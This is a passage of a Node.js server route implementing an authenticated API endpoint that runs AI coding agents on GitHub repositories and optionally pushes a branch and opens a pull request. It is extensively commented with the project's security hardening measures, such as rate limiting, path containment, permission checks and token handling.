    let totalOutput = 0;
    let totalCacheRead = 0;
    let totalCacheCreation = 0;

    for (const msg of this.messages) {
      let data = msg;

      // Parse if string
      if (typeof msg === 'string') {
        try {
          data = JSON.parse(msg);
        } catch (e) {
          continue;
        }
      }

      // Extract usage from claude-response messages
      if (data && data.type === 'claude-response' && data.data) {
        const msgData = data.data;
        if (msgData.message && msgData.message.usage) {
          const usage = msgData.message.usage;
          totalInput += usage.input_tokens || 0;
          totalOutput += usage.output_tokens || 0;
          totalCacheRead += usage.cache_read_input_tokens || 0;
          totalCacheCreation += usage.cache_creation_input_tokens || 0;
        }
      }
    }

    return {
      inputTokens: totalInput,
      outputTokens: totalOutput,
      cacheReadTokens: totalCacheRead,
      cacheCreationTokens: totalCacheCreation,
      totalTokens: totalInput + totalOutput + totalCacheRead + totalCacheCreation
    };
  }
}

// ===============================
// External API Endpoint
// ===============================

/**
 * POST /api/agent
 *
 * Trigger an AI agent to work on a project.
 * Supports automatic GitHub branch and pull request creation after successful completion.
 *
 * ================================================================================================
 * REQUEST BODY PARAMETERS
 * ================================================================================================
 *
 * @param {string} githubUrl - (Conditionally Required) GitHub repository URL to clone.
 *                             Supported formats:
 *                             - HTTPS: https://github.com/owner/repo
 *                             - HTTPS with .git: https://github.com/owner/repo.git
 *                             - SSH: git@github.com:owner/repo
 *                             - SSH with .git: git@github.com:owner/repo.git
 *
 * @param {string} projectPath - (Conditionally Required) Path to existing project OR destination for cloning.
 *                               Behavior depends on usage:
 *                               - If used alone: Must point to existing project directory
 *                               - If used with githubUrl: Target location for cloning
 *                               - If omitted with githubUrl: Auto-generates temporary path in ~/.claude/external-projects/
 *
 * @param {string} message - (Required) Task description for the AI agent. Used as:
 *                          - Instructions for the agent
 *                          - Source for auto-generated branch names (if createBranch=true and no branchName)
 *                          - Fallback for PR title if no commits are made
 *
 * @param {string} provider - (Optional) AI provider to use. Options: 'claude' | 'cursor' | 'codex' | 'gemini' | 'opencode'
 *                           Default: 'claude'
 *
 * @param {boolean} stream - (Optional) Enable Server-Sent Events (SSE) streaming for real-time updates.
 *                          Default: true
 *                          - true: Returns text/event-stream with incremental updates
 *                          - false: Returns complete JSON response after completion
 *
 * @param {string} model - (Optional) Model identifier for providers.
 *
 *                        Claude models: 'sonnet' (default), 'opus', 'haiku', 'opusplan', 'sonnet[1m]'
 *                        Cursor models: 'gpt-5' (default), 'gpt-5.2', 'gpt-5.2-high', 'sonnet-4.5', 'opus-4.5',
 *                                       'gemini-3-pro', 'composer-1', 'auto', 'gpt-5.1', 'gpt-5.1-high',
 *                                       'gpt-5.1-codex', 'gpt-5.1-codex-high', 'gpt-5.1-codex-max',
 *                                       'gpt-5.1-codex-max-high', 'opus-4.1', 'grok', and thinking variants
 *                        Codex models: 'gpt-5.2' (default), 'gpt-5.1-codex-max', 'o3', 'o4-mini'
 *
 * @param {boolean} cleanup - (Optional) Auto-cleanup project directory after completion.
 *                           Default: true
 *                           Behavior:
 *                           - Only applies when cloning via githubUrl (not for existing projectPath)
 *                           - Deletes cloned repository after 5 seconds
 *                           - Also deletes associated Claude session directory
 *                           - Remote branch and PR remain on GitHub if created
 *
 * @param {string} githubToken - (Optional) GitHub Personal Access Token for authentication.
 *                              Overrides stored token from user settings.
 *                              Required for:
 *                              - Private repositories
 *                              - Branch/PR creation features
 *                              Token must have 'repo' scope for full functionality.
 *
 * @param {string} branchName - (Optional) Custom name for the Git branch.
 *                             If provided, createBranch is automatically set to true.
 *                             Validation rules (errors returned if violated):
 *                             - Cannot be empty or whitespace only
 *                             - Cannot start or end with dot (.)
 *                             - Cannot contain consecutive dots (..)
 *                             - Cannot contain spaces
 *                             - Cannot contain special characters: ~ ^ : ? * [ \
 *                             - Cannot contain @{
 *                             - Cannot start or end with forward slash (/)
 *                             - Cannot contain consecutive slashes (//)
 *                             - Cannot end with .lock
 *                             - Cannot contain ASCII control characters
 *                             Examples: 'feature/user-auth', 'bugfix/login-error', 'refactor/db-optimization'
 *
 * @param {boolean} createBranch - (Optional) Create a new Git branch after successful agent completion.
 *                                Default: false (or true if branchName is provided)
 *                                Behavior:
 *                                - Creates branch locally and pushes to remote
 *                                - If branch exists locally: Checks out existing branch (no error)
 *                                - If branch exists on remote: Uses existing branch (no error)
 *                                - Branch name: Custom (if branchName provided) or auto-generated from message
 *                                - Requires either githubUrl OR projectPath with GitHub remote
 *
 * @param {boolean} createPR - (Optional) Create a GitHub Pull Request after successful completion.
 *                            Default: false
 *                            Behavior:
 *                            - PR title: First commit message (or fallback to message parameter)
 *                            - PR description: Auto-generated from all commit messages
 *                            - Base branch: Always 'main' (currently hardcoded)
 *                            - If PR already exists: GitHub returns error with details
 *                            - Requires either githubUrl OR projectPath with GitHub remote
 *
 * ================================================================================================
 * PATH HANDLING BEHAVIOR
 * ================================================================================================
 *
 * Scenario 1: Only githubUrl provided
 *   Input:  { githubUrl: "https://github.com/owner/repo" }
 *   Action: Clones to auto-generated temporary path: ~/.claude/external-projects/<hash>/
 *   Cleanup: Yes (if cleanup=true)
 *
 * Scenario 2: Only projectPath provided
 *   Input:  { projectPath: "/home/user/my-project" }
 *   Action: Uses existing project at specified path
 *   Validation: Path must exist and be accessible
 *   Cleanup: No (never cleanup existing projects)
 *
 * Scenario 3: Both githubUrl and projectPath provided
 *   Input:  { githubUrl: "https://github.com/owner/repo", projectPath: "/custom/path" }
 *   Action: Clones githubUrl to projectPath location
 *   Validation:
 *     - If projectPath exists with git repo:
 *       - Compares remote URL with githubUrl
 *       - If URLs match: Reuses existing repo
 *       - If URLs differ: Returns error
 *   Cleanup: Yes (if cleanup=true)
 *
 * ================================================================================================
 * GITHUB BRANCH/PR CREATION REQUIREMENTS
 * ================================================================================================
 *
 * For createBranch or createPR to work, one of the following must be true:
 *
 * Option A: githubUrl provided
 *   - Repository URL directly specified
 *   - Works with both cloning and existing paths
 *
 * Option B: projectPath with GitHub remote
 *   - Project must be a Git repository
 *   - Must have 'origin' remote configured
 *   - Remote URL must point to github.com
 *   - System auto-detects GitHub URL via: git remote get-url origin
 *
 * Additional Requirements:
 *   - Valid GitHub token (from settings or githubToken parameter)
 *   - Token must have 'repo' scope for private repos
 *   - Project must have commits (for PR creation)
 *
 * ================================================================================================
 * VALIDATION & ERROR HANDLING
 * ================================================================================================
 *
 * Input Validations (400 Bad Request):
 *   - Either githubUrl OR projectPath must be provided (not neither)
 *   - message must be non-empty string
 *   - provider must be 'claude', 'cursor', 'codex', 'gemini', or 'opencode'
 *   - createBranch/createPR requires githubUrl OR projectPath (not neither)
 *   - branchName must pass Git naming rules (if provided)
 *
 * Runtime Validations (500 Internal Server Error or specific error in response):
 *   - projectPath must exist (if used alone)
 *   - GitHub URL format must be valid
 *   - Git remote URL must include github.com (for projectPath + branch/PR)
 *   - GitHub token must be available (for private repos and branch/PR)
 *   - Directory conflicts handled (existing path with different repo)
 *
 * Branch Name Validation Errors (returned in response, not HTTP error):
 *   Invalid names return: { branch: { error: "Invalid branch name: <reason>" } }
 *   Examples:
 *   - "my branch" → "Branch name cannot contain spaces"
 *   - ".feature" → "Branch name cannot start with a dot"
 *   - "feature.lock" → "Branch name cannot end with .lock"
 *
 * ================================================================================================
 * RESPONSE FORMATS
 * ================================================================================================
 *
 * Streaming Response (stream=true):
 *   Content-Type: text/event-stream
 *   Events:
 *     - { type: "status", message: "...", projectPath: "..." }
 *     - { type: "claude-response", data: {...} }
 *     - { type: "github-branch", branch: { name: "...", url: "..." } }
 *     - { type: "github-pr", pullRequest: { number: 42, url: "..." } }
 *     - { type: "github-error", error: "..." }
 *     - { type: "done" }
 *
 * Non-Streaming Response (stream=false):
 *   Content-Type: application/json
 *   {
 *     success: true,
 *     sessionId: "session-123",
 *     messages: [...],        // Assistant messages only (filtered)
 *     tokens: {
 *       inputTokens: 150,
 *       outputTokens: 50,
 *       cacheReadTokens: 0,
 *       cacheCreationTokens: 0,
 *       totalTokens: 200
 *     },
 *     projectPath: "/path/to/project",
 *     branch: {               // Only if createBranch=true
 *       name: "feature/xyz",
 *       url: "https://github.com/owner/repo/tree/feature/xyz"
 *     } | { error: "..." },
 *     pullRequest: {          // Only if createPR=true
 *       number: 42,
 *       url: "https://github.com/owner/repo/pull/42"
 *     } | { error: "..." }
 *   }
 *
 * Error Response:
 *   HTTP Status: 400, 401, 500
 *   Content-Type: application/json
 *   { success: false, error: "Error description" }
 *
 * ================================================================================================
 * EXAMPLES
 * ================================================================================================
 *
 * Example 1: Clone and process with auto-cleanup
 *   POST /api/agent
 *   { "githubUrl": "https://github.com/user/repo", "message": "Fix bug" }
 *
 * Example 2: Use existing project with custom branch and PR
 *   POST /api/agent
 *   {
 *     "projectPath": "/home/user/project",
 *     "message": "Add feature",
 *     "branchName": "feature/new-feature",
 *     "createPR": true
 *   }
 *
 * Example 3: Clone to specific path with auto-generated branch
 *   POST /api/agent
 *   {
 *     "githubUrl": "https://github.com/user/repo",
 *     "projectPath": "/tmp/work",
 *     "message": "Refactor code",
 *     "createBranch": true,
 *     "cleanup": false
 *   }
 */
// SEC-AGENT-RL: /api/agent is the most dangerous authenticated surface in the
// app — it runs an agent with permissionMode:'bypassPermissions' inside a
// workspace, spawns git subprocesses, and (with createPR) talks to the GitHub
// API. It had NO rate limit at all, so a single leaked API key could be used to
// fan out unbounded concurrent agent runs (CPU/RAM exhaustion of the whole box,
// plus provider-quota burn). Same in-memory per-IP limiter used on the auth
// endpoints (middleware/rate-limit.js). Deliberately generous — agent runs are
// long and legitimately bursty — but bounded.
const agentLimiter = createRateLimiter({
  windowMs: 60_000,
  max: 20,
  message: 'Too many agent requests, please try again later',
});

router.post(
  '/sse-ticket',
  agentLimiter,
  requireExternalApiEnabled,
  validateExternalApiHeader,
  (req, res) => {
    if (req.assertCurrentIdentity?.() !== true) {
      return res.status(401).set('Cache-Control', 'no-store').json({ error: 'Invalid or inactive API key' });
    }
    const minted = mintAgentSseTicket({
      userId: req.user.id,
      role: req.user.role,
      authorizationGeneration: req.user.authorizationGeneration,
      authenticationCredentialId: req.user.authenticationCredentialId,
      path: `${req.baseUrl}/`,
      method: 'POST',
    });
    res.setHeader('Cache-Control', 'no-store');
    res.status(201).json(minted);
  },
);

// ADR-102 (T-1242): `requireExternalApiEnabled` MUST precede
// `validateExternalApiKey` — the latter's IS_PLATFORM branch authenticates
// without a credential, so a gate behind it would not gate that path at all.
// The order is pinned by server/services/external-api-gate.test.ts.
router.post('/', agentLimiter, requireExternalApiEnabled, validateExternalApiKey, async (req, res) => {
  const { githubUrl, projectPath, message, provider = 'claude', model, effort, githubToken, branchName, sessionId } = req.body;

  // Parse stream and cleanup as booleans (handle string "true"/"false" from curl)
  const stream = req.body.stream === undefined ? true : (req.body.stream === true || req.body.stream === 'true');
  const cleanup = req.body.cleanup === undefined ? true : (req.body.cleanup === true || req.body.cleanup === 'true');

  // If branchName is provided, automatically enable createBranch
  const createBranch = branchName ? true : (req.body.createBranch === true || req.body.createBranch === 'true');
  const createPR = req.body.createPR === true || req.body.createPR === 'true';
  let workspaceFence = null;

  // Validate inputs
  if (!githubUrl && !projectPath) {
    return res.status(400).json({ error: 'Either githubUrl or projectPath is required' });
  }

  if (!message || !message.trim()) {
    return res.status(400).json({ error: 'message is required' });
  }

  // KM-3/GL-8 (ADR-062): kimi and glm join the allowlist for the AGENT surface —
  // the /api/agent endpoint is inherently an agent run (never chat), so kimi maps
  // to the native governed launcher and glm to the OpenCode carrier (flag-gated,
  // enforced in the dispatch below). Their toolless CHAT path is unaffected.
  if (!['claude', 'cursor', 'codex', 'opencode', 'kimi', 'glm'].includes(provider)) {
    return res.status(400).json({ error: 'provider must be "claude", "cursor", "codex", "opencode", "kimi", or "glm"' });
  }

  // GL-8 (ADR-062): the GLM agent surface rides ENTIRELY on the OpenCode carrier,
  // which is gated behind the NASSAJ_OPENCODE_CARRIER fleet flag (default OFF). With
  // the flag OFF there is no available agent path for glm (its toolless chat surface
  // is separate and unaffected), so refuse here — a pre-flight refusal BEFORE any
  // writer/SSE headers or project registration, mirroring the WS dispatch where a
  // flag-OFF glm agent turn is never routed to the carrier. Flag OFF ⇒ exact prior
  // behavior (glm was not an allowed agent provider at all).
  if (provider === 'glm' && !isOpenCodeCarrierEnabled()) {
    return res.status(400).json({ error: 'glm agent provider is not enabled' });
  }

  // B-36: a client-supplied projectPath (existing project or clone target) must
  // resolve (symlinks included) inside WORKSPACES_ROOT — same containment gate
  // as project creation — so an API key cannot point the agent at arbitrary
  // host directories (e.g. /etc, another user's tree).
  if (projectPath) {
    const workspaceValidation = await validateWorkspacePath(projectPath);
    assertAgentAccessCurrent(req, null, true);
    if (!workspaceValidation.valid) {
      return res.status(400).json({ error: workspaceValidation.error });
    }
    if (!isProjectPathVisibleToUser(projectPath, req.user?.id ?? null)) {
      return res.status(404).json({ error: 'Project not found' });
    }
    if (isProjectMembershipEnforced()) {
      workspaceFence = captureWorkspaceTopologyFence(projectPath, req.user?.id ?? null, {
        sessionId: typeof sessionId === 'string' ? sessionId : null,
        consent: 'control',
      });
      if (!workspaceFence) return res.status(404).json({ error: 'Project not found' });
    }
  }

  if (sessionId && !isSessionVisibleToUser(sessionId, req.user?.id ?? null)) {
    return res.status(404).json({ error: 'Session not found' });
  }

  // Validate GitHub branch/PR creation requirements
  // Allow branch/PR creation with projectPath as long as it has a GitHub remote
  if ((createBranch || createPR) && !githubUrl && !projectPath) {
    return res.status(400).json({ error: 'createBranch and createPR require either githubUrl or projectPath with a GitHub remote' });
  }

  let finalProjectPath = null;
  let cloneCreationReceipt = null;
  let writer = null;
  // SEC-SSE-ABORT state. `requestCompleted` distinguishes the normal end-of-run
  // 'close' (which Node also emits) from a PREMATURE client disconnect.
  let requestCompleted = false;
  let clientDisconnected = false;

  /**
   * Premature client disconnect handler.
   *
   * Before this, `POST /api/agent` had NO disconnect handling at all: when the
   * caller hung up mid-stream the agent run kept going — writing every chunk
   * into a dead socket, holding its entry in claude-sdk's `activeSessions`, and
   * therefore holding the deployment gate open (safe-restart counts live
   * sessions; ghost-detach is disabled and DRAIN_TIMEOUT_MS=0 in this install).
   * A handful of abandoned curl calls could pin restarts indefinitely.
   *
   * Now: writes are muted immediately and, for the claude provider, the run is
   * aborted through the EXPORTED `abortClaudeSDKSession` (claude-sdk.js is not
   * modified). Other providers own their own child-process lifetime; for them we
   * only mute the writer and log, which is still a strict improvement.
   */
  const handleClientDisconnect = () => {
    if (requestCompleted || clientDisconnected) {
      return;
    }
    clientDisconnected = true;

    if (writer && typeof writer.markClientGone === 'function') {
      writer.markClientGone();
    }

    const runSessionId = writer && typeof writer.getSessionId === 'function'
      ? writer.getSessionId()
      : null;

    if (provider !== 'claude' || !runSessionId) {
      console.warn(
        `[agent] client disconnected mid-run (provider=${provider}, `
        + `session=${runSessionId || 'none'}); output muted`
      );
      return;
    }

    if (!isClaudeSDKSessionActive(runSessionId)) {
      return;
    }

    console.warn(`[agent] client disconnected — aborting claude session ${runSessionId}`);
    Promise.resolve()
      .then(() => abortClaudeSDKSession(runSessionId))
      .catch((abortError) => {
        console.error('[agent] failed to abort session after client disconnect:', abortError?.message);
      });
  };

  req.on('close', handleClientDisconnect);
  req.on('aborted', handleClientDisconnect);

  try {
    // Determine the final project path
    if (githubUrl) {
      // Clone repository (to projectPath if provided, otherwise generate path)
      const tokenToUse = githubToken || githubTokensDb.getActiveGithubToken(req.user.id);

      let targetPath;
      if (projectPath) {
        targetPath = projectPath;
      } else {
        // Generate a unique path for cloning
        const repoHash = crypto.createHash('md5').update(githubUrl + Date.now()).digest('hex');
        targetPath = path.join(os.homedir(), '.claude', 'external-projects', repoHash);
      }

      if (isProjectMembershipEnforced() && !workspaceFence) {
        const targetValidation = await validateWorkspacePath(targetPath);
        assertAgentAccessCurrent(req, null, true);
        if (!targetValidation.valid) return res.status(400).json({ error: targetValidation.error });
        workspaceFence = captureWorkspaceTopologyFence(targetPath, req.user?.id ?? null);
        if (!workspaceFence) return res.status(404).json({ error: 'Project not found' });
      }
      assertAgentAccessCurrent(req, workspaceFence, true);

      const cloneResult = await cloneGitHubRepoWithReceipt(githubUrl.trim(), tokenToUse, targetPath);
      finalProjectPath = cloneResult.projectPath;
      cloneCreationReceipt = cloneResult.creationReceipt;
      assertAgentAccessCurrent(req, workspaceFence, false);

      // B-36 edge case: a githubUrl-only request generates its own clone path which
      // bypassed the validateWorkspacePath pre-flight above (only projectPath was
      // checked). Run the same containment gate on the post-clone path so the auto-
      // generated clone target also stays inside WORKSPACES_ROOT and is never a
      // system directory.
      const clonePathValidation = await validateWorkspacePath(finalProjectPath);
      assertAgentAccessCurrent(req, workspaceFence, false);
      if (!clonePathValidation.valid) {
        if (cloneCreationReceipt) {
          try {
            await applyCloneRetentionPolicy(cloneCreationReceipt, { cleanup });
          } catch (cleanupError) {
            return res.status(500).json({
              error: 'Created repository cleanup failed',
              code: cleanupError?.code ?? 'CLONE_CLEANUP_FAILED',
            });
          }
        }
        return res.status(400).json({ error: clonePathValidation.error });
      }
    } else {
      // Use existing project path
      finalProjectPath = normalizeProjectPath(path.resolve(projectPath));

      // Verify the path exists
      try {
        await fs.access(finalProjectPath);
        assertAgentAccessCurrent(req, workspaceFence, false);
      } catch (error) {
        if (error instanceof AgentAccessFenceError) throw error;
        throw new Error(`Project path does not exist: ${finalProjectPath}`);
      }
    }

    finalProjectPath = normalizeProjectPath(finalProjectPath);
    assertAgentAccessCurrent(req, workspaceFence, !githubUrl);

    // Register project path in DB (or reuse existing registration).
    // Attribute the creator so the private-project authorization layer (B-PRIV)
    // can identify the owner. Re-used rows keep their original created_by.
    // B-1096: launching or resuming a session must NOT un-archive the project —
    // preserveArchived keeps an archived row archived (restore is /restore-only);
    // an existing row (active or archived) returns as active_conflict.
    const creatorUserId = Number.isInteger(req.user?.id) ? req.user.id : null;
    const registrationResult = projectsDb.createProjectPath(finalProjectPath, null, creatorUserId, { preserveArchived: true });
    if (registrationResult.outcome === 'active_conflict') {
      console.log('Project registration already exists for:', finalProjectPath);
    } else {
      console.log('Project registered:', registrationResult.project);
    }

    const registeredProject = projectsDb.getProjectPath(finalProjectPath);
    if (!registeredProject?.project_id || !Number.isInteger(req.user?.id)) {
      return res.status(503).json({
        error: 'Permission launch context is unavailable.',
        code: 'PERMISSION_LAUNCH_CONTEXT_INVALID',
        notStarted: true,
      });
    }
    workspaceFence = isProjectMembershipEnforced()
      ? captureWorkspaceTopologyFence(finalProjectPath, req.user.id, {
          sessionId: typeof sessionId === 'string' ? sessionId : null,
          consent: 'control',
        })
      : null;
    if (isProjectMembershipEnforced() && !workspaceFence) {
      throw new AgentAccessFenceError('project_access_changed', true);
    }
    assertAgentAccessCurrent(req, workspaceFence, true);
    let permissionExecution;
    try {
      const authorizeProviderExecution = req.app?.locals?.authorizeProviderExecution;
      if (typeof authorizeProviderExecution !== 'function') {
        throw new Error('PERMISSION_AUTHORIZER_UNAVAILABLE');
      }
      const permission = authorizeProviderExecution(req.user, {
        launchId: crypto.randomUUID(),
        principalId: `user:${req.user.id}`,
        sessionId: typeof sessionId === 'string' && sessionId ? sessionId : null,
        projectId: registeredProject.project_id,
        workspacePath: finalProjectPath,
        provider,
        body: provider,
        engine: provider === 'claude' || provider === 'codex' ? 'sdk' : 'cli',
        entrypoint: 'rest.agent',
        purpose: provider === 'claude' || provider === 'codex' ? 'sdk_turn' : 'spawn',
      });
      if (permission.kind === 'denied') {
        return res.status(403).json({
          error: 'The requested permission profile is unavailable.',
          code: 'PERMISSION_DENIED',
          reasonCodes: permission.reasonCodes,
          notStarted: true,
        });
      }
      permissionExecution = permission.execution;
    } catch (error) {
      return res.status(503).json({
        error: 'Permission admission failed closed.',
        code: error?.code || 'PERMISSION_ADMISSION_UNAVAILABLE',
        notStarted: true,
      });
    }

    // Set up writer based on streaming mode
    if (stream) {
      assertAgentAccessCurrent(req, workspaceFence, true);
      // Set up SSE headers for streaming
      res.setHeader('Content-Type', 'text/event-stream');
      res.setHeader('Cache-Control', 'no-cache');
      res.setHeader('Connection', 'keep-alive');
      res.setHeader('X-Accel-Buffering', 'no'); // Disable nginx buffering

      writer = new SSEStreamWriter(res, req.user.id, req.user, () => {
        if (req.assertCurrentIdentity?.() !== true) return 'identity_changed';
        return workspaceFence && !isWorkspaceTopologyFenceCurrent(workspaceFence)
          ? 'project_access_changed' : null;
      });
      const registrationStale = writer.staleAccessCode();
      if (registrationStale) throw new AgentAccessFenceError(registrationStale, true);

      // Send initial status
      writer.send({
        type: 'status',
        message: githubUrl ? 'Repository cloned and session started' : 'Session started',
        projectPath: finalProjectPath
      });
    } else {
      // Non-streaming mode: collect messages
      writer = new ResponseCollector(req.user.id);

      // Collect initial status message
      writer.send({
        type: 'status',
        message: githubUrl ? 'Repository cloned and session started' : 'Session started',
        projectPath: finalProjectPath
      });
    }

    let providerModels;
    try {
      if (provider === 'codex' || provider === 'opencode') {
        assertAgentAccessCurrent(req, workspaceFence, true);
        providerModels = (await providerModelsService.getProviderModels(
          provider,
          {},
          req.user?.id ?? null,
          req.user,
        )).models;
        assertAgentAccessCurrent(req, workspaceFence, false);
      }
    } catch (error) {
      try { permissionExecution.notStarted(); } catch { /* durable generation block is authoritative */ }
      throw error;
    }

    // Start the appropriate session
    assertAgentAccessCurrent(req, workspaceFence, true);
    if (provider === 'claude') {
      console.log('🤖 Starting Claude SDK session');

      await queryClaudeSDK(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model,
        // Structured effort field (low|medium|high|xhigh|max|ultracode|auto).
        // Validated against the allowlist in mapCliOptionsToSDK; unknown values
        // are safely ignored there.
        effort: effort,
        permissionMode: 'bypassPermissions', // Bypass all permissions for API calls
        permissionExecution,
      }, writer);

    } else if (provider === 'cursor') {
      console.log('🖱️ Starting Cursor CLI session');

      await runPermissionExecutionAdapter(permissionExecution, () => spawnCursor(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || undefined,
        skipPermissions: true // Bypass permissions for Cursor
      }, writer));
    } else if (provider === 'codex') {
      console.log('🤖 Starting Codex SDK session');

      await queryCodex(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || providerModels.DEFAULT,
        // T-884: run autonomously (no approval prompts) but capped to the
        // workspace-write ceiling. Pinning 'acceptEdits' — NOT 'bypassPermissions' —
        // keeps this headless path at workspace-write even if the
        // CODEX_ALLOW_FULL_ACCESS escape hatch is ever enabled for another path.
        permissionMode: 'acceptEdits',
        permissionExecution,
      }, writer);
    } else if (provider === 'opencode') {
      console.log('Starting OpenCode CLI session');

      await runPermissionExecutionAdapter(permissionExecution, () => spawnOpenCode(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || providerModels.DEFAULT
      }, writer));
    } else if (provider === 'kimi') {
      // KM-3 (ADR-062): native governed Kimi agent launcher. permissionMode is
      // pinned to 'acceptEdits' — the SAFE autonomous ceiling (workspace-write via
      // Kimi `--auto`), mirroring the Codex T-884 headless mapping. The SL-4
      // ceiling caps this even if KIMI_ALLOW_FULL_ACCESS is ever set, and network
      // stays OFF; a client value never widens it. Governance/digest/env-sanitize
      // are enforced fail-closed inside prepareKimiAgentLaunch.
      console.log('🌙 Starting Kimi native agent session');

      await runPermissionExecutionAdapter(permissionExecution, () => spawnKimiAgent(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        model: model || undefined,
        permissionMode: 'acceptEdits'
      }, writer));
    } else if (provider === 'glm') {
      // GL-8 (ADR-062): GLM runs through the OpenCode CARRIER (provider-prefixed
      // `glm/<model>`, carrier=true so opencode-cli.js takes its governed carrier
      // path: GL-5 governance gate + GL-3 baseURL allowlist + GL-6 digest pin +
      // env sanitize). The carrier flag is already asserted ON by the pre-flight
      // guard above, so reaching here means the surface is enabled.
      console.log('🧩 Starting GLM session via OpenCode carrier');

      const rawGlmModel = typeof model === 'string' ? model.trim() : '';
      const carrierModel = rawGlmModel
        ? (rawGlmModel.startsWith('glm/') ? rawGlmModel : `glm/${rawGlmModel}`)
        : undefined;

      await runPermissionExecutionAdapter(permissionExecution, () => spawnOpenCode(message.trim(), {
        projectPath: finalProjectPath,
        cwd: finalProjectPath,
        sessionId: sessionId || null,
        carrier: true,
        ...(carrierModel ? { model: carrierModel } : {})
      }, writer));
    }
    assertAgentAccessCurrent(req, workspaceFence, false);

    // Handle GitHub branch and PR creation after successful agent completion
    let branchInfo = null;
    let prInfo = null;

    if (createBranch || createPR) {
      try {
        assertAgentAccessCurrent(req, workspaceFence, false);
        console.log('🔄 Starting GitHub branch/PR creation workflow...');

        // Get GitHub token
        const tokenToUse = githubToken || githubTokensDb.getActiveGithubToken(req.user.id);

        if (!tokenToUse) {
          throw new Error('GitHub token required for branch/PR creation. Please configure a GitHub token in settings.');
        }

        // Initialize Octokit
        const octokit = new Octokit({ auth: tokenToUse });

        // Get GitHub URL - either from parameter or from git remote.
        // SEC-GIT-URL: both sources go through the SAME strict validator; the
        // old `.includes('github.com')` here had the identical bypass as the
        // clone gate. `repoUrl` is then replaced by the CANONICAL rebuilt URL,
        // so everything downstream (buildTokenPushUrl → `git push <url>`) only
        // ever sees https://github.com/<owner>/<repo>.git.
        let repoUrl;
        let owner;
        let repo;
        if (githubUrl) {
          ({ owner, repo, cloneUrl: repoUrl } = parseSafeGitHubUrl(githubUrl));
        } else {
          console.log('🔍 Getting GitHub URL from git remote...');
          let remoteUrl;
          try {
            assertAgentAccessCurrent(req, workspaceFence, false);
            remoteUrl = await getGitRemoteUrl(finalProjectPath);
            assertAgentAccessCurrent(req, workspaceFence, false);
          } catch (error) {
            if (error instanceof AgentAccessFenceError) throw error;
            throw new Error(`Failed to get GitHub remote URL: ${error.message}`);
          }
          try {
            ({ owner, repo, cloneUrl: repoUrl } = parseSafeGitHubRemote(remoteUrl));
          } catch {
            throw new Error('Project does not have a GitHub remote configured');
          }
          console.log(`✅ Found GitHub remote: ${repoUrl}`);
        }
        console.log(`📦 Repository: ${owner}/${repo}`);

        // Use provided branch name or auto-generate from message
        const finalBranchName = branchName || autogenerateBranchName(message);
        if (branchName) {
          console.log(`🌿 Using provided branch name: ${finalBranchName}`);

          // Validate custom branch name
          const validation = validateBranchName(finalBranchName);
          if (!validation.valid) {
            throw new Error(`Invalid branch name: ${validation.error}`);
          }
        } else {
          console.log(`🌿 Auto-generated branch name: ${finalBranchName}`);
        }

        if (createBranch) {
          // Create and checkout the new branch locally
          console.log('🔄 Creating local branch...');
          assertAgentAccessCurrent(req, workspaceFence, false);
          const checkoutProcess = spawn('git', ['checkout', '-b', finalBranchName], {
            cwd: finalProjectPath,
            stdio: 'pipe'
          });

          await new Promise((resolve, reject) => {
            let stderr = '';
            checkoutProcess.stderr.on('data', (data) => { stderr += data.toString(); });
            checkoutProcess.on('close', (code) => {
              if (code === 0) {
                console.log(`✅ Created and checked out local branch '${finalBranchName}'`);
                resolve();
              } else {
                // Branch might already exist locally, try to checkout
                if (stderr.includes('already exists')) {
                  console.log(`ℹ️ Branch '${finalBranchName}' already exists locally, checking out...`);
                  try {
                    assertAgentAccessCurrent(req, workspaceFence, false);
                  } catch (error) {
                    reject(error);
                    return;
                  }
                  const checkoutExisting = spawn('git', ['checkout', finalBranchName], {
                    cwd: finalProjectPath,
                    stdio: 'pipe'
                  });
                  checkoutExisting.on('close', (checkoutCode) => {
                    if (checkoutCode === 0) {
                      console.log(`✅ Checked out existing branch '${finalBranchName}'`);
                      resolve();
                    } else {
                      reject(new Error(`Failed to checkout existing branch: ${stderr}`));
                    }
                  });
                } else {
                  reject(new Error(`Failed to create branch: ${stderr}`));
                }
              }
            });
          });

          // Push the branch to remote.
          // The canonical repository URL and branch ref are the only operands.
          // Authentication is supplied through an ephemeral owner-only askpass
          // file, never through URL userinfo, argv, logs, or returned errors.
          console.log('🔄 Pushing branch to remote...');
          assertAgentAccessCurrent(req, workspaceFence, false);
          const pushResult = await pushGitHubBranch({
            repoUrl,
            token: tokenToUse,
            branchName: finalBranchName,
            cwd: finalProjectPath,
          });
          assertAgentAccessCurrent(req, workspaceFence, false);
          console.log(
            pushResult.reused
              ? `ℹ️ Branch '${finalBranchName}' already exists on remote, using existing branch`
              : `✅ Pushed branch '${finalBranchName}' to remote`,
          );

          // When we pushed via a token URL (no -u possible against a raw URL),
          // record the upstream against the clean `origin` remote so .git/config
          // tracks origin — never the token-embedded URL.
          if (tokenToUse) {
            try {
              assertAgentAccessCurrent(req, workspaceFence, false);
              await new Promise((resolve) => {
                const cfg = spawn('git', ['config', `branch.${finalBranchName}.remote`, 'origin'], { cwd: finalProjectPath, stdio: 'pipe' });
                cfg.on('close', () => resolve());
                cfg.on('error', () => resolve());
              });
              assertAgentAccessCurrent(req, workspaceFence, false);
              await new Promise((resolve) => {
                const cfg = spawn('git', ['config', `branch.${finalBranchName}.merge`, `refs/heads/${finalBranchName}`], { cwd: finalProjectPath, stdio: 'pipe' });
                cfg.on('close', () => resolve());
                cfg.on('error', () => resolve());
              });
              assertAgentAccessCurrent(req, workspaceFence, false);
            } catch (error) {
              if (error instanceof AgentAccessFenceError) throw error;
              // Upstream tracking is best-effort; the push already succeeded.
            }
          }

          branchInfo = {
            name: finalBranchName,
            url: `https://github.com/${owner}/${repo}/tree/${finalBranchName}`
          };
        }

        if (createPR) {
          // Get commit messages to generate PR description
          console.log('🔄 Generating PR title and description...');
          assertAgentAccessCurrent(req, workspaceFence, false);
          const commitMessages = await getCommitMessages(finalProjectPath, 5);
          assertAgentAccessCurrent(req, workspaceFence, false);

          // Use the first commit message as the PR title, or fallback to the agent message
